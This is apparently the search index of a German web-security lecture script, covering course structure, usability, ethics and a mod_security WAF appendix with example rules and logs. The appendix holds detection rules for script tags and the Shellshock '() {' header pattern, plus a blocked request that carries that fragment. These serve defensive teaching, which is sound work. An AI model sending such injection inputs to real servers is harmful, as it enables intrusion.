{"config":{"lang":["de"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Web Security","text":""},{"location":"#struktur-dieses-dokumentes","title":"Struktur dieses Dokumentes","text":"<p>Zur besseren Verst\u00e4ndlichkeit wurde ein Top-Down-Approach gew\u00e4hlt. Im Zuge der Vorlesung bew\u00e4hrte sich dies, da auf diese Weise die Studenten vom Allgemeinen in die jeweiligen Spezialf\u00e4lle gef\u00fchrt werden k\u00f6nnen.</p> <p>Im ersten Part Einf\u00fchrung versuche ich das Umfeld von Security zu beleuchten. Da meine Welt urspr\u00fcnglich die Softwarenentwicklung war, gebe ich hier auch einen groben \u00dcberblick wie Security w\u00e4hrend der Entwicklung beachtet werden kann. Zus\u00e4tzlich versuche ich unser Zielumfeld, Web-Applikatoinen, etwas genauer zu betrachten. Auf diese Weise soll auch sicher gestellt werden, dass Studenten bzw. Leser einen ausreichenden Wissensstand vor Beginn der eigentlichen Security-Themen besitzen.</p> <p>Der n\u00e4chste Part (Authentication und Autorisierung) behandelt high-level Fehler bei der Implementierung der Benutzer- und Berechtigungskontrolle. Drei Kapitel (Authentication, Authorization, Federation/Single Sign-On) beschreiben Gebiete, die applikationsweit betrachtet werden m\u00fcssen \u2014 falls hierbei Fehler auftreten, ist zumeist die gesamte Applikation betroffen und gebrochen.</p> <p>Im darauf folgenden Part (Injection Attacks) wird auf verschiedene Injection-Angriffe eingegangen. Hier wurde zwischen Angriffen, die direkt gegen den Webserver, und Angriffen die einen Client (zumeist Webbrowser) ben\u00f6tigen, unterschieden. W\u00e4hrend auch hier Schutzma\u00dfnahmen am besten global f\u00fcr die gesamte Applikation durchgef\u00fchrt werden sollten, betrifft hier eine Schwachstelle zumeist einzelne Operationen und kann dadurch auch lokal korrigiert werden.</p>"},{"location":"#out-of-scope-fur-dieses-skript","title":"Out-of-Scope f\u00fcr dieses Skript","text":"<p>Auf drei wichtige Bereiche wird im Zuge dieses Skripts nicht explizit eingegangen:</p>"},{"location":"#denial-of-service-angriffe","title":"Denial-of-Service Angriffe","text":"<p>Denial-of-Service Angriffe zielen darauf ab, die Verf\u00fcgbarkeit einer Applikation zu beeintr\u00e4chtigen. Dadurch kann der Dienst nicht mehr benutzt bzw. konsumiert werden und dem Betreiber entstehen Kosten, z.B. Verdienstentgang durch einen ausgefallenen Webshop.</p> <p>Ein DoS-Angriff zielt entweder auf eine Applikations-bezogene Ressource wie z.B. erlaubte Verbindungen pro Applikationsbenutzer oder eine fundamentale Systemressource wie z.B. CPU-Zeit, Speicher oder Netzwerkbandbreite ab. Als Applikationsentwickler kann man bei Ressourcen-intensiven Operationen mittels Rate-Limits die Situation entsch\u00e4rfen.</p> <p>In diesem Dokument wird nicht tiefer auf DoS-Angriffe eingegangen, da diese quasi die Holzhammermethode darstellen. Gerade gegen\u00fcber Angriffen gegen die Netzwerkbandbreite kann nur \u00fcber kommerzielle Cloud- bzw. Rechenzentrenbetreiber entgegengewirkt werden. Diese sind kostspielig und es entsteht eine Asymmetrie: die Abwehr des Angriffs kann kostspieliger als der Angriff selbst werden. Somit wird aus einem technischen DoS ein monet\u00e4rer DoS.</p>"},{"location":"#security-und-usability","title":"Security und Usability","text":"<p>Es gibt das Vorurteil, dass Sicherheit und Usability kontr\u00e4r zueinander sind. W\u00e4hrend dies in wenigen bedauerlichen Einzelf\u00e4llen gegeben sein kann, sollte dies nicht als Pauschalausrede missbraucht werden.</p> <p>Der Benutzer will prim\u00e4r eine Aufgabe erledigen. Im Zuge der Erledigung dieser Aufgabe sollte Sicherheit nicht im Weg stehen. Stattdessen sollte der offensichtliche Weg der Aufgabenerledigung sicher implementiert sein und den Benutzer \u00fcber einen sicheren Weg zur Erledigung der Aufgabe leiten. Falls sicherheitsrelevante Benutzerentscheidungen notwendig sind, sollten diese m\u00f6glichst fr\u00fch erfolgen \u2014 wird dies w\u00e4hrend der Abarbeitung einer Aufgabe durchgef\u00fchrt, kann der Benutzer so fokussiert sein, dass die Sicherheitsentscheidung nur peripher beachtet wird.</p> <p>Ebenso sollte der Benutzer nicht mit irrelevanten Fragen bombardiert werden da daruch nur der \u201cMeldung-wegklicken\u201d-Reflex des Benutzers konditioniert wird. Die Willigkeit eines Benutzers, auf Sicherheit R\u00fccksicht zu nehmen ist begrenzt, vergleichbar mit einer Batterie. Wenn diese ersch\u00f6pft ist, wird weniger (oder gar keine) R\u00fccksicht auf die Security genommen.</p> <p>Ein besserer Weg ist es, per default sichere Prozesse zu implementieren und im Bedarfsfall unsichere Operationen durch den Benutzer explizit zu erlauben. Die dabei verwendeten Benutzerinteraktionen sollten dem NEAT-Prinzipien gen\u00fcgen:</p> <ul> <li> <p>Necessary: kann die Applikation, anstatt den Benutzer zu fragen, das   Problem auf eine andere sichere Art und Wiese l\u00f6sen?</p> </li> <li> <p>Explained: besitzt der Benutzer das notwendige Wissen um eine   informierte Entscheidung zu treffen?</p> </li> <li> <p>Actionable: kann der Benutzer \u00fcberhaupt sinnvoll auf die   dargestellte Meldung reagieren?</p> </li> <li> <p>Tested: ist die Meldung innerhalb der UX sinnvoll und wurde   getestet, ob sie in jeglicher Form von Benutzerfluss sinnvoll ist?</p> </li> </ul> <p>Im Zuge der DSGVO/GDPR wurde bestimmt, dass Software secure by design and default sein muss. Dies bedeutet, dass Software die M\u00f6glichkeit einer sicheren Konfiguration bieten, und diese im Auslieferungszustand auch sicher konfiguriert sein muss. Ein dagegen verstossendes Beispiel w\u00e4re der Einsatz von Default-Passw\u00f6rtern.</p>"},{"location":"#ethical-web-development","title":"Ethical Web Development","text":"<p>Technik an sich ist wertneutral. Sobald diese allerdings in Ber\u00fchrung mit der Realit\u00e4t kommt, entsteht ein ethischer Impact. Web Applikationen sind hier keine Ausnahme. Im Zuge des Skripts wird auf ethischen Impact nicht explizit eingegangen, da der Inhalt der Vorlesung das Werkzeug und nicht das Ziel des erstellten Werks ist.</p> <p>Um die ethische Dimension nicht vollst\u00e4ndig zu ignorieren, ein paar Richtlinien der EDRi:</p> <p>Allow as much data processing on an individual\u2019s device as possible. Dies w\u00fcrde im Web-Umfeld den Einsatz von JavaScript bedingen, da nur auf diese Weise Daten direkt im Browser des Benutzers verarbeitet werden k\u00f6nnen.</p> <p>Where you must deal with user data, use encryption. Dies inkludiert sowohl Transport-Level Encryption (wie TLS) als auch Verschl\u00fcsselung der bearbeiteten Daten.</p> <p>Where possible also use data minimisation methods. Das Minimalprinzip sollte auch auf die gespeicherten Daten angewendet werden. Daten die eine Applikation nicht besitzt sind Daten, die auch nicht entwendet oder zweckentfremdet werden k\u00f6nnen.</p> <p>Use first-party resources and avoid using third-party resources. Es besteht die Sorge, dass externe Ressourcen modifiziert werden k\u00f6nnten. Dies soll durch die Verwendung eigener Ressourcen vermieden werden. Falls notwendig, k\u00f6nnen CSP-Direktiven bzw. Subresource Integrity verwendet werden um die Integrit\u00e4t externer Ressourcen sicherzustellen.</p> <p>[1] Subjektiv im Auge des Betrachters.</p>"},{"location":"appendix/history/","title":"Entstehungsgeschichte und co","text":"<p>Ich will jetzt nicht mit der ,,Software ist allgegenw\u00e4rtig\u201d-Standardfloskel beginnen. Ich glaube, dass dies die Lebensrealit\u00e4t jedens ist, der dieses Buch liest. Der freie Zugriff auf Informationen und das neue Level an Vernetztheit f\u00fchren zu sozialen und \u00f6konomischen Entwicklungen deren Auswirkungen teilweise nicht absehbar sind. Es sind interessante Zeiten, in denen wir leben; als Informatiker, Hacker, etc. sind wir sind Teil einer privilegierten Schicht und d\u00fcrfen auch den Anspruch erheben, Teil dieses Wandels zu sein. Im urspr\u00fcnglichen Sinn des Wortes waren Hacker Personen, die Spa\u00df an der Arbeit mit neuen Technologien hatten und diese auch zweckentfremdeten \u2014 The Street will find its own uses for things wie William Gibson richtig bemerkte.</p> <p>Technologie verbessert das Leben der Menschen, beinhaltet aber auch Risiken. Durch die Allgegenw\u00e4rtigkeit von Software wurden und werden Personen von dieser abh\u00e4ngig. Fehler gef\u00e4hrden Menschen und \u00d6konomie. Gerade weil Software so vielseitig ist, k\u00f6nnen auch vielseitige Fehler entstehen. Wenn diese b\u00f6sartig ausgenutzt werden[1] ist der Schritt vom Hacker zum Cracker vollzogen. With great power comes great responsibility \u2014 dies gilt auch f\u00fcr Softwareentwickler. Ich selbst hielt mich f\u00fcr einen guten Softwareentwickler, wurde Penetration-Tester und sah meinen ehemaligen Code mit neuen Augen. Meine Meinung \u00fcber mich selbst \u00e4nderte sich rapide.</p> <p>Im Fr\u00fchjahr 2019 erhielt ich das Angebot, an der FH/Technikum Wien einen Kurs Web Security zu halten und hoffe, dass ich damit einen kleinen Teil beitrage die sub-optimale Sicherheitssituation zu verbessern. Dieses Dokument dient als Skript, auch weil ich bef\u00fcrchte, w\u00e4hrend des Vortrags wichtige Punkte zu \u00fcbersehen bzw. als M\u00f6glichkeit Basisinformationen aus der Vorlesung auszulagern. Es gibt leider zu viele Schwachstellen und zu wenig Zeit um jede durchzugehen. Ein Beweggrund f\u00fcr mich auf der Fachhochschule zu unterrichten ist, dass wir alle Fehler machen. Unser Ausbildungsniveau sollte zumindest so hoch sein, dass wir zumindest innovative Fehler begehen.</p> <p>Ich sp\u00fcre aber auch die Angst, etwas zu ver\u00f6ffentlichen das potentiell Fehler beinhaltet oder auch teilweise meine Meinung widerspiegelt. In der Webentwicklung gibt es keine perfekte Wahrheit, Dinge \u00e4ndern sich. Ich habe dieses Skript nach der zweiten Iteration meiner Vorlesung, nach positivem Feedback in \u00f6ffentlichen Foren als auch durch Studenten, 2020 offiziell h\u00f6chst-nerv\u00f6s ver\u00f6ffentlicht.</p> <p>Ich hoffe, dass die schlimmsten Missverst\u00e4ndnisse bereits durch meine Studenten erkannt, und von mir ausgebessert, wurden. Wenn nicht, w\u00fcrde ich mich um ein kurzes Feedback unter andreas@offensive.one freuen. Ich stufe Feedback als essentiell daf\u00fcr ein, dass meine zuk\u00fcnftigen Studenten einen guten Unterricht erhalten.</p>"},{"location":"appendix/mod_security/","title":"WAF: mod_security","text":"<p>mod_security ist eine Web-Application Firewall \u2014 dies bedeutet, dass sie laut IOS/OSI Model auf Applikationsebene (Level 7) arbeitet und daher auch die Sprache der Applikation (in diesem Fall HTTP) spricht und versteht. Sie ist eine der bekanntesten Open-Source WAFs und wird daher im Zuge dieses Skripts betrachtet.</p> <p>Laut dem eigenen Selbstverst\u00e4ndnis bietet sie Real-Time Application Security Monitoring and Access Control: ein- und ausgehende HTTP Anfragen und Antworten k\u00f6nnen in Echtzeit analysiert und aufgrund von Regeln kontrolliert (z. B. blockiert) werden. mod_security blockiert by Default keinen Traffic, alle Entscheidungen m\u00fcssen explizit \u00fcber Regeln konfiguriert werden. Ein h\u00e4ufig verwendeter Regelsatz ist de OWASP Core Rule Set (CRS). Die WAF f\u00fchrt kein Input-Sanititzing durch: ein Request wird also entweder akzeptiert oder blockiert. Dies war eine Design-Entscheidung des Entwicklers um sich auf eine Kernaufgabe zu konzentrieren und diese gut zu l\u00f6sen (do one thing and do this well).</p> <p>mod_security kann entweder als Apache Modul (daher der Name= innerhalb eines bestehenden Apache Webservers integriert werden, oder als eigenst\u00e4ndiger Reverse-Proxy (als eigenst\u00e4ndiger Apache-Server) vor mehrere Applikationsserver vorgeschalten werden.</p> <p>Wie bereits erw\u00e4hnt ist der prim\u00e4re Einsatzzweck von mod_security ist das Monitoren und Kontrollieren von HTTP Traffic in Echtzeit und das Erstellen von Zugriffsentscheidungen aufgrund dieses Traffics. Konkreter kann z. B. Virtual Patching durchgef\u00fchrt werden. Dabei wird eine Sicherheitsl\u00fccke gepatched ohne, dass die Web-Applikation selbst angepasst wird. Beispielsweise k\u00f6nnte es sich bei dem Sicherheitsproblem um einen 0day (ohne verf\u00fcgbaren Patch), oder bei der Applikation um eine ungewartete propriet\u00e4re Applikation handeln. In diesem Fall w\u00fcrde das Angriffsmuster analysiert und f\u00fcr den Angriffsvektor eine Regel hinterlegt werden, welche b\u00f6sartige Angriffe automatisiert erkennt und die jeweiligen Requests blockiert. Eine weitere M\u00f6glichkeit ist die Verwendung vordefinierter Regelwerker zum Hardening bestehender Applikationen (dadurch wird eine weitere Schutzschicht \u00fcber eine eigentlich sichere Applikation eingezogen).</p> <p>Eine untersch\u00e4tzte M\u00f6glichkeit von mod_security ist der Einsatz als Log-Quelle. Webserver protokollieren im Normalfall nur die zugegriffene URL (also keinen Request-Body und auch keine Antwortdokumente). Mittels mod_security kann ein Administrator nun genau definieren, welche Requests in welcher Tiefe protokolliert werden sollten.</p>"},{"location":"appendix/mod_security/#functionality-and-transactions","title":"Functionality and Transactions","text":"<p>Grunds\u00e4tzlich kann die implementierte Funktionalit\u00e4t in vier Bereiche aufgeteilt werden:</p> <ul> <li> <p>parsing: eingehende und ausgehende HTTP Nachrichten m\u00fcssen   analysiert werden.</p> </li> <li> <p>buffering: teilweise werden Nachrichten auf mehrere Teilnachrichten   aufgeteilt. mod_security sammelt diese, f\u00fcgt diese zu einer   gemeinsamen Nachricht zusammen und ruft erst danach die Filterregeln   auf.</p> </li> <li> <p>rule-engine: ist die aktive Komponente welche die bereitgestellten   Regeln auf die gesammelten HTTP-Nachrichten anwendet.</p> </li> <li> <p>logging: f\u00fchrt das Logging durch.</p> </li> </ul> <p>Hier kann man auch schon den Overhead von mod_security erkennen: auf der einen Seite gibt es einen CPU-Overhead da alle Nachrichten analysiert werden m\u00fcssen, auf der anderen Seite m\u00fcssen f\u00fcr das Buffering alle ein- und aus-gehenden Nachrichten im Speicher gesammelt werden und f\u00fchren so zu Speicher-Overhead. Falls zu viel Speicher verbraucht wird, m\u00fcssen Nachrichten auf der Festplatte/SSD zwischengespeichert werden. Beides erh\u00f6ht die Latenz-Zeit die ein Benutzer wahrnimmt.</p> <p>Ein eingehender HTTP Request und die dazugeh\u00f6rende Response durchl\u00e4uft innerhalb von mod_security folgende f\u00fcnf Phasen:</p> <ol> <li> <p>request headers : cheap, decide if you want to look at body content</p> </li> <li> <p>request body : think POST-Requests, attached Files</p> </li> <li> <p>response headers : cheap, decide if you want to look at body content</p> </li> <li> <p>response body, attached Files</p> </li> <li> <p>logging : decide if the request/response will be logged or not</p> </li> </ol> <p>In Phase 1 und 2 kann das Weiterleiten des Requests zum Applikationsserver blockiert werden. Innerhalb der phase 3 und 4 kann das Antwortdokument zum Client blockiert werden, die Operation wird allerdings am Applikationsserver exekutiert (dies kann z. B. verwendet werden um Data-Extraktion zu verhindern). Inder Phase 5 kann ein Request nicht mehr blockiert werden.</p>"},{"location":"appendix/mod_security/#beispielstransaktion","title":"Beispielstransaktion","text":"<p>Anhand der Debug-Logs von mod_security wird hier nochmal eine Transaktion erkl\u00e4rt.</p> <p>Folgender Input Request mit jeweils einem Parameter in der URL (a) und einem Parameter im Body (b).</p> <pre><code>POST /?a=test HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\n\nb=test\n</code></pre> <p>Dies f\u00fchrt zu folgendem Antwortdokument mit der Nachricht Hello World! im Content:</p> <pre><code>HTTP/1.1 200 OK\nDate: Sun, 17 Jan 2010 00:13:44 GMT\nServer: Apache\nContent-Length: 12\nConnection: close\nContent-Type: text/html\n\nHello World!\n</code></pre> <p>Folgende Phasen k\u00f6nnen nun in den Log-Dateien erkannt werden:</p> <pre><code>[4] Initialising transaction (txid SopXW38EAAE9YbLQ).\n[5] Adding request argument (QUERY_STRING): name \"a\", value \"test\"\n[4] Transaction context created (dcfg 8121800).\n[4] Starting phase REQUEST_HEADERS.\n</code></pre> <p>F\u00fcr jeden eingehenden HTTP-Request wird zun\u00e4chst eine eindeutige Transaktions-ID vergeben. Anschlie\u00dfend wird der HTTP Header analysiert und der Parameter a extrahiert. Abschlie\u00dfend werden die Regeln der Phase 1 (Request-Header) angewandt.</p> <pre><code>[4] Second phase starting (dcfg 8121800).\n[4] Input filter: Reading request body.\n[9] Input filter: Bucket type HEAP contains 6 bytes.\n[9] Input filter: Bucket type EOS contains 0 bytes.\n[5] Adding request argument (BODY): name \"b\", value \"test\"\n[4] Input filter: Completed receiving request body (length 6).\n[4] Starting phase REQUEST_BODY.\n</code></pre> <p>Falls die Nachricht noch nicht blockiert wurde, wird nun der Content des Requests analysiert und dabei der Parameter b extrahiert. Jetzt besitzt mod_security Zugriff auf alle Parameter und die Regeln der Phase 2 (Request Body) werden angewendet.</p> <pre><code>[4] Hook insert_filter: Adding input forwarding filter (r 81d0588).\n[4] Hook insert_filter: Adding output filter (r 81d0588).\n\n[4] Input filter: Forwarding input: mode=0, block=0, nbytes=8192 (f 81d2228, r 81d0588).\n[4] Input filter: Forwarded 6 bytes.\n[4] Input filter: Sent EOS.\n[4] Input filter: Input forwarding complete.\n</code></pre> <p>Wenn auch diese Regeln den Request nicht verwerfen, wird der Request an den Applikationsserver/die Applikation weitergeleitet. mod_security kann nun abwarten, bis ein entsprechendes Antwortdokument empfangen wird.</p> <pre><code>[9] Output filter: Receiving output (f 81d2258, r 81d0588).\n[4] Starting phase RESPONSE_HEADERS.\n\n[9] Output filter: Bucket type MMAP contains 12 bytes.\n[9] Output filter: Bucket type EOS contains 0 bytes.\n[4] Output filter: Completed receiving response body (buffered full - 12 bytes).\n[4] Starting phase RESPONSE_BODY.\n</code></pre> <p>Analog zu der Request-Phase wird nun das Antwortdokument analysiert und die Regeln der jeweiligen Phasen (3 und 4) angewendet. Hier sieht man auch sch\u00f6n, dass auch das Antwortdokument gespeichert wird \u2014 werden z. B. viele gro\u00dfe Dokumente zugestellt (oder Dateien heruntergeladen) m\u00fcssen diese zwischengespeichert, und auf diese Weise serverseitig viele Ressourcen verbraucht, werden.</p> <pre><code>[4] Output filter: Output forwarding complete.\n[4] Initialising logging.\n[4] Starting phase LOGGING.\n[4] Audit log: Ignoring a non-relevant request.\n</code></pre> <p>Abschlie\u00dfend wird noch die Log-Phase durchspielt und aufgrund dieser erkannt, ob der Request bzw. die Response in die Logdatei aufgenommen werden sollte.</p>"},{"location":"appendix/mod_security/#rules","title":"Rules","text":"<p>Das Herz einer mod_security Installation sind die verwendeten Filterregeln. Diese besitzen immer das idente Format:</p> <pre><code>SecRule ARGS OPERATOR ACTIONS\n</code></pre> <p>Die jeweiligen Bereiche sind einfacher erkl\u00e4rt:</p> <ul> <li> <p>ARGS: beschreibt auf welchen Bereich (z. B. auf welchen Parameter) eine jeweilige Operation angewendet werden soll.</p> </li> <li> <p>OPERATOR: definiert die Abfrage/den Filter der auf die ARGS angewandt werden soll.</p> </li> <li> <p>ACTIONS: beschreibt die Aktivit\u00e4ten (z. B. blockieren und loggen) die angewandt werden, falls der Operator erfolgreich auf die Argumente angewandt werden konnte.</p> </li> </ul>"},{"location":"appendix/mod_security/#rules-args","title":"Rules: Args","text":"<p>Beispiele f\u00fcr m\u00f6gliche Argumente:</p> <ul> <li> <p>ARGS (GET+POST arguments)</p> </li> <li> <p>ARGS_GET, ARGS_POST: die Parameter dre Header/des Contents</p> </li> <li> <p>FILES: hochgeladene Dateien</p> </li> <li> <p>FULL_REQUEST: der gesamte Request</p> </li> <li> <p>QUERY_STRING, REQUEST_BODY: raw data</p> </li> <li> <p>REQUEST_HEADERS: Header Werte</p> </li> <li> <p>REQUEST_METHOD: die Verwendete HTTP Methode (POST/GET)</p> </li> <li> <p>REQUEST_URI</p> </li> <li> <p>REQUEST_LINE</p> </li> <li> <p>REMOTE_ADDRESS: die Adresse des zugreifenden Clients</p> </li> </ul>"},{"location":"appendix/mod_security/#operatoren","title":"Operatoren","text":"<p>Operatoren beginnen meistens mit einem @-Symbol, einige Beispiele:</p> <ul> <li> <p>\"@contains &lt;script &gt;\": \u00fcberpr\u00fcft ob in den Arguments ein   script-Tag vorkommt</p> </li> <li> <p>\"@detectSQLi\": \u00fcberpr\u00fcft die Arguments auf SQL-Injection-Muster</p> </li> <li> <p>\"@detectXSS\": \u00fcberpr\u00fcft die Arguments auf XSS-Muster</p> </li> <li> <p>\"@inspectFile /path/to/util/runav.pl\": die Arguments werden an das   angef\u00fchrte Skripts \u00fcbergeben, das Ergebnis des Operators ist das   Ergebnis des Skripts. Auf diese Weise kann z. B. jedes hochgeladene   File mittels eines Virenscanners \u00fcberpr\u00fcft werden, bevor dieses File   an den Applikationsserver \u00fcbergeben wird.</p> </li> <li> <p>\"@ipMatch 192.168.1.100\": Vergleich auf eine IP-Adresse</p> </li> <li> <p>\"@validateDTD /path/to/xml.dtd\": \u00fcberpr\u00fcft ob das \u00fcbergebene   Argument einem definierten XML-Schema entspricht.</p> </li> </ul>"},{"location":"appendix/mod_security/#actions","title":"Actions","text":"<p>Actions definieren die Operationen, die exekutiert werden sollten falls die Operatoren erfolgreich angewandt werden konnten. Diese Operatoren k\u00f6nnen lt. mod_security Dokumentation in verschiedene Bereiche eingeteilt werden:</p> <ul> <li> <p>disruptive: ver\u00e4ndern den Datenfluss, z. B. allow oder deny</p> </li> <li> <p>flow: beziehen sich auf die Regeln selbst, z. B. skip oder chain</p> </li> <li> <p>meta-data: dienen zur Dokumentation</p> </li> <li> <p>variable: f\u00fcr komplexe Regeln k\u00f6nnen Variablen gesetzt bzw.   ausgelesen werden</p> </li> <li> <p>logging: Definition der Daten, die geloggt werden sollten</p> </li> <li> <p>special</p> </li> <li> <p>miscellaneous: everything else</p> </li> </ul>"},{"location":"appendix/mod_security/#beispiele","title":"Beispiele","text":"<p>Ein einfaches primitives Beispiel:</p> <pre><code>SecRule ARGS \"@contains &lt;script&gt;\" log,deny,status:404\n</code></pre> <p>Diese Regeln verwendet als Datenquelle alle extrahierten Argumente (ARGS) und \u00fcberpr\u00fcft, ob in diesen ein HTML script-Tag vorkommt. In dem Fall wird die Anfrage mit einem 404 Fehler blockiert und geloggt.</p> <p>Eine komplexere Regel:</p> <pre><code>SecRule REQUEST\\_LINE|REQUEST\\_HEADERS|REQUEST\\_HEADERS\\_NAMES \"@contains () \\{\" \"id:420008,phase:2,t:none,t:lowercase,deny,status:500,log,msg:'Malware expert - user-agent: Bash ENV Variable Injection Attack'\"\n</code></pre> <p>Diese Regel sucht in verschiedenen Datenquellen nach dem String () {. Dieser String beschreibt einen Bash-Funktionsaufruf und sollte in regul\u00e4rem Verkehr nicht vorkommen. Falls dieser String gefunden wird, wird der Request mit einem 500er Statuscode abgelehnt und protokolliert.</p> <pre><code>SecRule REMOTE\\_ADDR \"@ipMatch 192.168.1.101\" id:102,phase:1,t:none,nolog,pass,ctl:ruleEngine:off\n</code></pre> <p>Diese Regel w\u00fcrde Verkehr von der IP-Adresse 192.168.1.101 immer akzeptieren (durch ruleEngine:off werden keine Folgeregeln mehr verwendet), diese Requests werden ebenso nicht geloggt. Dadurch wird ein Whitelisting der IP-Adresse durchgef\u00fchrt.</p> <pre><code>SecRule ARGS:username \u201c@streq admin\u201d chain,deny\nSecRule REMOTE\\_ADDR \u201c!streq 192.168.1.111\u201d\n</code></pre> <p>Das letzte Beispiel zeigt, wie zwei Regeln mittels chain verkn\u00fcpft werden. Es wird zuerst die erste Regel angewendet (f\u00fcr das Argument username wurde der Wert admin verwendet) und dann mit der Regel die IP-Adresse ist nicht 192.168.1.111 kombiniert. Falls beide Regeln wahr sind, wird die Anfrage abgelehnt. Dies entspricht also der Regel Ein Administrator darf sich nur ausgehend von der IP-Adresse 192.168.1.111 einloggen.</p>"},{"location":"appendix/mod_security/#log-format","title":"Log Format","text":"<p>Das mod_security Format entspricht nicht 100% anderen bekannten Log-Formaten. Eine protokollierte Transaktion wird \u00fcber mehrere Sublogs beschrieben. Jedes Sublog beginnt mit einem MIME-\u00e4hnlichem Header, dieser besteht aus einer eindeutigen ID \u00fcber welchen die Sublogs aggregiert werden k\u00f6nnen (in dem Beispiel f9adec1d) und einer Log-Kategorie (dies ist der angeh\u00e4ngte Buchstabe).</p> <pre><code>--f9adec1d-A--\n[25/Sep/2016:18:42:50 +0300] V@fwen8AAQEAAA2TDbQAAAAK 127.0.0.1 35965 127.0.0.1 443\n--f9adec1d-B--\nGET / HTTP/1.1\nHost: malware.expert\nAccept: */*\nUser-Agent: () {\n\n--f9adec1d-F--\nHTTP/1.1 500 Internal Server Error\nContent-Length: 613\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n--f9adec1d-E--\n\n--f9adec1d-H--\nMessage: Access denied with code 500 (phase 2). String match \"() {\" at REQUEST_HEADERS:User-Agent. [file \"/etc/modsecurity/malware_expert.conf\"] [line \"97\"] [id \"420008\"] [msg \"Malware expert - user-agent: Bash ENV Variable Injection Attack\"]\nAction: Intercepted (phase 2)\nStopwatch: 1474818170070960 1010 (- - -)\nStopwatch2: 1474818170070960 1010; combined=177, p1=25, p2=147, p3=0, p4=0, p5=5, sr=55, sw=0, l=0, gc=0\nResponse-Body-Transformed: Dechunked\nProducer: ModSecurity for Apache/2.9.0 (http://www.modsecurity.org/).\nServer: Apache\nEngine-Mode: \"ENABLED\"\n\n--f9adec1d-Z--\n</code></pre> <p>In Abh\u00e4ngigkeit der Transaktion k\u00f6nnen unterschiedliche Log-Kategorien bef\u00fcllt werden. A beinhaltet immer den Zeitstempel und die Adressen der betroffenen Kommunikationspartner, B ist der eingehende Request, F die erzeugte Antwort; H beschreibt die Regel die angewandt wurde.</p> <p>Leider ist es nicht so einfach diese Informationen mittels grep zu parsen.</p>"},{"location":"appendix/mod_security/#owasp-core-ruleset","title":"OWASP Core Ruleset","text":"<p>Es macht nat\u00fcrlich wenig Sinn, f\u00fcr jede mod_security-Installation getrennte Regelwerke f\u00fcr common Angriffsvektoren zu erstellen. Aus diesem Grund haben sich Default-Regelwerke gebildet die als Initiale Regeln eingespielt werden k\u00f6nnen. Das bekannteste Beispiel hierf\u00fcr ist das OWASP Core Rule Set (auch CRS genannt), die aktuelle Version ist 3, dieses Regelwerk wird gerne zum Hardening von Webservern verwendet.</p> <p>Dieses Ruleset beinhaltet Regeln welche die Angriffsvektoren der OWASP Top 10 (als auch weitere Angriffsvektoren) abdecken. Um dieses Regelwerk zu aktivieren, l\u00e4dt der Administrator den Regelsatz als auch ein Konfigurations-File (crs-setup.conf) vom OWASP-Server herunter und inkludiert diese innerhalb der Konfiguration des Apache Webservers. Dabei kann der Admin entweder alle Regeln inkludieren oder nur einzelne Subbereiche (z. B. nur Regeln f\u00fcr SQL-Injection Angriffe).</p> <p>Ein h\u00e4ufiges Problem von Web Application Firewalls ist, dass valide Anfragen als Schadcode erkannt werden (diese Fehler werden auch als false positives bezeichnet). Eine hohe Rate an false positives zerst\u00f6rt die Benutzerakzeptanz und f\u00fchrt im Normalfall dazu, das die WAF aus Akzeptanzgr\u00fcnden wieder deaktiviert wird. Um dem entgegenzuwirken besitzt das OWASP Core Rule Set eine Paranoia-Einstellung welche von 1 (default) bis 4 gesetzt werden kann. Je h\u00f6her das Paranoia-Level umso mehr Schadcodes werden erkannt, allerdings steigt damit auch das Risiko von False-Positives. In Abh\u00e4ngigkeit der Gef\u00e4hrdung der Applikation kann nun ein geeignetes Paranoia-Level gew\u00e4hlt werden.</p>"},{"location":"appendix/mod_security/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was versteht man unter einer Web-Application Firewall? Welche    Einsatzzwecke bzw. Verwendungsm\u00f6glichkeitne gibt es f\u00fcr solche?</p> </li> <li> <p>Aus welchen Teilen besteht eine mod_security Regel? Erl\u00e4utere die    jeweiligen Teile.</p> </li> <li> <p>Was wird durch folgende Regel: SecRule ARGS \"@contains    &lt;script&gt;\" log,deny,status:404 durchgef\u00fchrt?</p> </li> <li> <p>Was ist der Grundgedanke dabei, DevOps und Security zu verbinden?</p> </li> <li> <p>Welche Sicherheitsma\u00dfnahmen k\u00f6nnen im Zuge von SecDevOps    automatisiert durchgef\u00fchrt werden? Erl\u00e4utere die jeweiligen    Ma\u00dfnahmen.</p> </li> </ol>"},{"location":"appendix/weitere-informationen/","title":"Weiterf\u00fchrende Informationen","text":"<p>Dieses Dokument kann nur eine grobe Einf\u00fchrung in Sicherheitsthemen bieten. Es ist als kurzweiliges Anfixen gedacht und soll weitere selbstst\u00e4ndige Recherchen motivieren. Aus diesem Grund will ich hier auf einige weitere Fortbildungsm\u00f6glichkeiten verweisen. Diese sollen als erste Anlaufstelle f\u00fcr ein potentielles Selbststudium dienen.</p>"},{"location":"appendix/weitere-informationen/#what-to-read","title":"What to read?","text":"<p>F\u00fcr weitere Informationen sind die Dokumente des OWASP empfehlenswert. OWASP selbst ist eine Non-Profit Organisation welche urspr\u00fcnglich das Ziel hatte, die Sicherheit von Web-Anwendungen zu erh\u00f6hen, mittlerweile aber auch im Mobile Application bzw. IoT Umfeld t\u00e4tig ist. Das bekannteste OWASP-Dokument sind wahrscheinlich die OWASP Top 10 welche eine Sammlung der 10 h\u00e4ufigsten Sicherheitsschwachstellen im Web sind.</p> <p>Der OWASP Application Security Verification Standard, kurz ASVS, bietet eine Checkliste die von Penetration-Testern bzw. Software-Entwicklern verwendet werden kann, um Software auf die jeweiligen Gegenma\u00dfnahmen f\u00fcr die OWASP Top 10 Angriffsvektoren zu testen. Der OWASP Testing Guide liefert zu jedem Angriffsvektor Hintergrundinformationen, potentielle Testm\u00f6glichkeiten als auch Referenzen auf Gegenma\u00dfnahmen. Dieser Guide sollte eher als Referenz und nicht als Einf\u00fchrungsdokument verwendet werden.</p> <p>Prinzipiell ist es f\u00fcr Personen im Security-Umfeld h\u00f6chst erstrebenswert sowohl Programmier- als auch Softwarearchitektur-Kenntnisse zu besitzen. F\u00fcr ersteres bietet sich das Studium von JavaScript (z. B. \u00fcber https://javascript.info) an. Diese Sprache wird sowohl server- als auch client-seitig (z. B. innerhalb eines Webbrowsers) eingesetzt, das Erlernte kann dadurch an verschiedenen Stellen relevant 